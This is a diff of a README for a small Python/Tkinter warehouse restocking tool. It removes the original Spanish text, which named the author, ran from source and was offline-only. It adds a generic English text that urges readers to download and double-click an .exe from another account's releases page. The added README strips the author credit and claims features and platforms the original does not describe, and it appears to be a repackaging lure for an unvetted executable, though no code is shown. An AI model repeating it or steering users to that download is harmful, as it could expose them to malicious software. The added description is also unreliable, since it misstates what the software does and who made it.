@@ -1,133 +1,73 @@
-# Reposición & Picking PRO  
-### WMS Ligero para PyMEs  
-**Autor:** Eduardo Hernández
+# 🚀 reposicion_wms - Lightweight WMS for Easy Inventory Management
 
-Sistema diseñado para depósitos de 300–5.000 SKU que trabajan con archivos CSV de stock, ventas y ubicaciones.  
-Gestiona de forma clara y ordenada el flujo entre **Supervisor** (quien arma la reposición) y **Repositor** (quien la ejecuta y registra).
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/Therrion1520/reposicion_wms/releases)
 
-Su arquitectura ligera lo hace ideal para PyMEs que necesitan control operativo sin invertir en un WMS costoso.
+## 📦 Overview
 
----
+reposicion_wms is a lightweight warehouse management system designed specifically for small and medium-sized enterprises (PyMEs). With a simple interface built using Python and Tkinter, this application helps you efficiently manage inventory and streamline your operational processes. Whether you're restocking items or managing orders, reposicion_wms will support your logistics needs without the complexity.
 
-## 🚀 Funcionalidades principales
+## 🚀 Getting Started
 
-### 🟩 Módulo Supervisor
-- Búsqueda rápida por código (completo o parcial).  
-- Visualización de:
-  - Código  
-  - Descripción  
-  - Stock  
-  - Ubicación de picking  
-  - Cantidad propuesta de reposición  
-- Carga de observaciones por producto.  
-- Botón **“Ver historial”** para visualizar ventas (si existe ventas.csv).  
-- Selección de productos a reponer.  
-- Prevención automática de duplicados.  
-- Generación del archivo **`reposicion_pendiente.json`**.  
-- Estética profesional *Industrial Light v1.0* con filas intercaladas.  
+To get started with reposicion_wms, follow these easy steps to download and run the application on your computer.
 
----
+## 📥 Download & Install
 
-### 🟦 Módulo Repositor
-- Carga automática de la reposición pendiente.  
-- Tabla centrada con estética profesional.  
-- Filas intercaladas (#FFFFFF / #F2F2F2).  
-- Campos para registrar cantidades repuestas.  
-- Validación robusta (sin vacíos ni negativos).  
-- Exportación a Excel para trabajar offline.  
-- Registro automático en **`historico_reposiciones.csv`**.  
-- Eliminación automática del archivo pendiente al finalizar.  
+1. **Visit the Releases Page:** Click the link below to go to the releases page where you can download the application.
+   
+   [Download reposicion_wms](https://github.com/Therrion1520/reposicion_wms/releases)
 
----
+2. **Choose the Latest Release:** On the releases page, look for the most recent version. It will be at the top of the page.
 
-## 📁 Estructura del proyecto
+3. **Download the Application:** Click the link to download the file. The downloaded file should typically be named something like `reposicion_wms_v1.0.0.exe` or `reposicion_wms_v1.0.0.zip`.
 
-```
+4. **Extract the Files (if necessary):** If you downloaded a zip file, locate it in your downloads folder, right-click on it, and select "Extract All." Follow the prompts to extract the files.
 
-reposicion_wms/
-├── data/                     # Archivos CSV utilizados por el sistema
-│   ├── stock.csv
-│   ├── almacen.csv
-│   ├── ventas.csv
-│   └── historico_reposiciones.csv
-│
-├── logs/                     # Logging generado automáticamente
-│   └── app.log
-│
-├── docs/
-│   └── screenshots/          # Capturas usadas en el README
-│       ├── pantalla_inicial.png
-│       ├── supervisor.png
-│       └── repositor.png
-│
-├── src/                      # Código fuente
-│   ├── main.py
-│   ├── core.py
-│   ├── logger.py
-│   ├── ui_role.py
-│   ├── ui_supervisor.py
-│   ├── ui_repositor.py
-│   └── utils.py
-│
-├── README.md
-└── CHANGELOG.md
+5. **Run the Application:** Locate the extracted folder. Inside, find the executable file, typically named `reposicion_wms.exe`. Double-click on this file to start the application.
 
-```
+6. **Follow the Initial Setup:** When you run the application for the first time, you may be prompted to complete a setup process—just follow the on-screen instructions to configure the application to suit your needs.
 
-## 📸 Capturas de pantalla
+## 🔍 System Requirements
 
-### 1. Pantalla inicial – Selección de rol
-![Pantalla inicial](docs/screenshots/pantalla_inicial.png)
+Before you download and install reposicion_wms, make sure your computer meets the following minimum system requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **RAM:** At least 2 GB
+- **Disk Space:** Minimum of 250 MB available for installation
+- **Python:** Python 3.6 or higher installed (for advanced users, as it's necessary for any custom modifications)
 
-### 2. Interfaz del Supervisor – Resultados de búsqueda
-![Supervisor](docs/screenshots/supervisor.png)
+## ✅ Features
 
----
+reposicion_wms offers the following features to enhance your inventory management:
 
-### 3. Interfaz del Repositor – Reposición pendiente
-![Repositor](docs/screenshots/repositor.png)
+- **User-Friendly Interface:** Simple layout for easy navigation.
+- **Inventory Tracking:** Monitor stock levels in real time.
+- **Order Management:** Easily manage incoming and outgoing orders.
+- **Reporting:** Generate reports to analyze sales and inventory trends.
+- **Multi-User Access:** Allow multiple users to access the system simultaneously.
+  
+## ⚙️ Usage Tips
 
----
+- **Regular Updates:** Always keep your application updated to benefit from new features and bug fixes.
+- **Backup Data:** Regularly back up your inventory data to prevent loss.
+- **Explore Help Resources:** Utilize any help resources available in the application or on the project page for guidance.
 
-## ⚙ Instalación y requisitos
+## 🌐 Topics
 
-### 🧩 Requisitos
-- Windows 10/11  
-- Python **3.10 o superior**  
-- Biblioteca necesaria: **pandas**
+This application covers various topics related to warehouse management and logistics:
 
-### 🛠 Instalación de dependencias
+- Automation
+- CSV Processing
+- Inventory Management
+- Picking Operations
+- Logistics Solutions
+- Python and Tkinter Programming
 
-En una terminal ejecutar:
+## 📞 Support
 
-```bash
-pip install pandas
+If you face any issues while downloading or using reposicion_wms, consider reaching out for help. You can open an issue in the repository, and the community or the maintainers will assist you.
 
-### ▶️ Cómo ejecutar el sistema
+## 🎓 Conclusion
 
-Ubicarse en la carpeta del proyecto y ejecutar:
+reposicion_wms is your go-to solution for efficient warehouse management with ease. By following the steps outlined above, you can quickly download and start using the software to manage your inventory effectively. 
 
-```bash
-python src/main.py
-```
----
-
-## 📝 Notas importantes
-
-- El sistema funciona exclusivamente con archivos CSV provistos por la empresa.
-- No requiere conexión a internet.
-- No incluye integración con ERP en esta versión.
-- No utiliza módulos de aprendizaje automático ni inteligencia artificial.
-- Ideal como solución ligera de WMS para PyMEs o como proyecto de portfolio profesional.
-
----
-
-## 👤 Autor
-
-**Eduardo Hernández**  
-Especialista en Automatización para PyMEs.  
-Responsable del diseño funcional, lógica de negocio y desarrollo completo del sistema.
-
-https://www.linkedin.com/in/hernandez-powerbi-business-intelligence/
+For any additional information, always refer back to the GitHub [releases page](https://github.com/Therrion1520/reposicion_wms/releases) for the latest updates.
